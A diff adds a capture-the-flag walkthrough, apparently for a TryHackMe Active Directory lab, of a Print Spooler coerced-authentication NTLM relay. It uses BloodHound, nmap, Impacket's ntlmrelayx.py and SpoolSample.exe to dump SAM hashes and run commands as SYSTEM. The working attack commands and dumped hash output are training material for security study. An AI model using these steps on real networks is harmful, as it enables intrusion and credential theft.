@@ -1390,3 +1390,138 @@ Get the flag:
 cd C:\Users\Administrator\Desktop
 type flag2.txt
 ```
+
+This attack forces a machine account to authenticate to an attacker's SMB server by abusing the Print Spooler service ("Printer Bug"). The relayed authentication allows privileged access to another machine. We use BloodHound to identify machine accounts with admin privileges over others, verify Print Spooler and SMB signing conditions, then use SpoolSample.exe and Impacket's ntlmrelayx.py to exploit the relay.
+
+First we need to identify machines with Admin privileges over others. We need to use `bloodhound` to check which machine accounts have administrative access over other machines. 
+Open `bloodhound`:
+
+```shell
+sudo neo4j start
+bloodhound --no-sandbox
+```
+
+Click __Create custom query__ under the _Analysis_ tab. Run the following __Cypher Query__ to find machines with `AdminTo` relationships:
+
+```sql
+MATCH p=(c1:Computer)-[r1:MemberOf*1..]->(g:Group)-[r2:AdminTo]->(n:Computer) RETURN p
+```
+
+The query shows that there is a `SERVER MANAGEMENT@ZA.TRYHACKME.LOC` group, which has admin privileges over _`THMSERVER1`_ and a member of which is _`THMSERVER2`_. Let's connect to `THMWRK1`:
+
+```shell
+ssh za.tryhackme.loc@justin.barnes@thmwrk1.za.tryhackme.loc
+```
+
+Once there we check if THMSERVER2 has the Print Spooler service running, as it is required for coercing authentication.
+
+```powershell
+GWMI Win32_Printer -Computer thmserver2.za.tryhackme.loc
+```
+
+The output looks like this:
+
+```
+Location      :
+Name          : Microsoft XPS Document Writer
+PrinterState  : 0
+PrinterStatus : 3
+ShareName     :
+SystemName    : THMSERVER2
+
+Location      :
+Name          : Microsoft Print to PDF
+PrinterState  : 0
+PrinterStatus : 3
+ShareName     :
+SystemName    : THMSERVER2
+```
+
+This means __Print Spooler__ is running. Now from our __attacking machine__ we need to determine if SMB signing is unenforced for the _NTLM_ relay to work: 
+
+```shell
+nmap --script=smb2-security-mode -p445 thmserver1.za.tryhackme.loc thmserver2.za.tryhackme.loc
+```
+
+The output should look like this:
+
+```
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+
+Host script results:
+| smb2-security-mode:
+|   3:1:1:
+|_    Message signing enabled but not required
+```
+
+This means that SMB signing is allowed but __not enforced__ which makes the system vulnerable. 
+
+Now we need to set up an NTLM relay attack. First let's find a script called `ntlmrelayx.py` on our attacking machine:
+
+```shell
+sudo updatedb
+locate ntlmrelayx.py
+/usr/share/doc/python3-impacket/examples/ntlmrelayx.py
+```
+
+Now let's set up this script to capture and relay NTLM authentication attempts:
+
+```shell
+python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -smb2support -t smb://"10.200.47.201" -debug
+```
+
+Our relay server is now waiting for authentication attempts. Now, we force THMSERVER2 to authenticate to our malicious SMB server. From an SSH session on THMWRK1, run SpoolSample.exe to trigger authentication:
+
+```powershell
+C:\tools\SpoolSample.exe THMSERVER2.za.tryhackme.loc "10.50.45.173"
+```
+
+This command should dump the hashes for various users on this server:
+
+```
+...
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+[+] Calculating HashedBootKey from SAM
+[+] NewStyle hashes is: True
+ServerAdmin:500:aad3b435b51404eeaad3b435b51404ee:3279a0c6dfe15dc3fb6e9c26dd9b066c:::
+[+] NewStyle hashes is: True
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+[+] NewStyle hashes is: True
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+[+] NewStyle hashes is: True
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:92728d5173fc94a54e84f8b457af63a8:::
+[+] NewStyle hashes is: True
+vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e96eab5f240174fe2754efc94f6a53ae:::
+[+] NewStyle hashes is: True
+trevor.local:1001:aad3b435b51404eeaad3b435b51404ee:43460d636f269c709b20049cee36ae7a:::
+[*] Done dumping SAM hashes for host: 10.200.47.201
+...
+```
+
+Now let's test a command execution. On attacking machine run:
+
+```shell
+sudo python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -smb2support -t smb://10.200.47.201 -c 'whoami' -debug
+```
+
+And on the SSH session to THMWRK1, run:
+
+```powershell
+C:\tools\SpoolSample.exe THMSERVER2.za.tryhackme.loc "10.50.45.173"
+```
+
+The result on the attacking machine should be:
+
+```
+[*] Executed specified command on host: 10.200.47.201
+nt authority\system
+```
+
+Which means we can now get the flag:
+
+```shell
+sudo python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -smb2support -t smb://10.200.47.201 -c 'type C:\Users\Administrator.ZA\Desktop\flag3.txt' -debug
+```
+
+Get the flag!
